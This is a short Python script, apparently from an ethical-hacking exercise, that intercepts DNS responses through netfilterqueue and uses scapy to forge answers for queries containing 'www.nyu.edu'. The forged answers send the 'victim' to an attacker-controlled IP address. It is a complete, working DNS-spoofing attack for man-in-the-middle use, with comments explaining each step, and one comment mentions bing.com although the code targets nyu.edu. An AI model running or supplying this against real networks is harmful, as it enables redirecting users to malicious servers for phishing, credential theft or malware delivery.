#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packets):
    scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
    if scapy_packet.haslayer(scapy.DNSRR): # To look for DNS Response
        qname = scapy_packet[scapy.DNSQR].qname # if the victim is looking for the target website, qname is the website
        if "www.nyu.edu" in qname: # To check if the website is in the qname
            print("[+] Spoofing target")
            spoof_ans = scapy.DNSRR(rrname=qname, rdata="Put IP address of your server here") # To redirect the user to bing.com to my server
                                                                       # Where rrname is equal to the qname
                                                                       # P.S We are creating a DNS RESPONSE
            scapy_packet[scapy.DNS].an = spoof_ans # Modifying answer field
            scapy_packet[scapy.DNS].ancount = 1 # So it corresponds to the number of answers

            # We need to delete the length and chksum so it doesn't corrupt the packet so it will recalculate according
            # To the packet we have modified
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # We will set the packet to the payload and convert it into a string
            packets.set_payload(str(scapy_packet))

    packets.accept()  # accept packets

queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
queue.bind(0, process_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
# the call back function
queue.run() # to run the function
